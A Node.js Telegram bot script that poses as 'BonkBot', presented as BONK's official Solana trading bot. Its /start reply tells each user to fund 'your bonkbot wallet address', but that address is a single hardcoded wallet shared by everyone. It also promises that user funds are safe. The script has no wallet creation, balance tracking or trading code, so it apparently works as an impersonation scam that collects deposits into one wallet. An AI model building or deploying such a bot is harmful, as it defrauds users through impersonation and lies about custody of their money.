const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const dotenv = require("dotenv");
const app = express();

dotenv.config({ path: "./config.env" });

const token = process.env.TELEGRAM_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const wallet = ` <b>
    <a
      href="#"
      style="color: #008000;"
      onclick='window.prompt(\"Copy bonkbot wallet address:\",\"79D47aKkx8DSVJ1qrG8qyhWhKDmNMoMvJDZJoqDUomra\")'
    >79D47aKkx8DSVJ1qrG8qyhWhKDmNMoMvJDZJoqDUomra</a>
  </b>`;

const messages = {
  start: `*Welcome to BonkBot* \nSolana's fastest bot to trade any coin (SPL token), and BONK's official Telegram trading bot.\n\nYou currently have no SOL balance. To get started with trading, send some SOL to your bonkbot wallet address:\n${wallet}\nOnce done tap refresh and your balance will appear here.\n\nTo buy a token just enter a token address, or even post the birdeye link of the coin.\n\nFor more info on your wallet and to retrieve your private key, tap the wallet button below. We guarantee the safety of user funds on BONKbot, but if you expose your private key your funds will not be safe.`,
};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  console.log(msg);
  bot.sendMessage(chatId, messages.start, { parse_mode: "HTML" });
});

app.get("*", (req, res) => {
  res.send("Telegram bot running");
});

const port = process.env.PORT || 3000;
app.listen(port, (err) => {
  if (err) console.log(err);
  console.log(`Server running on port ${port}`);
});
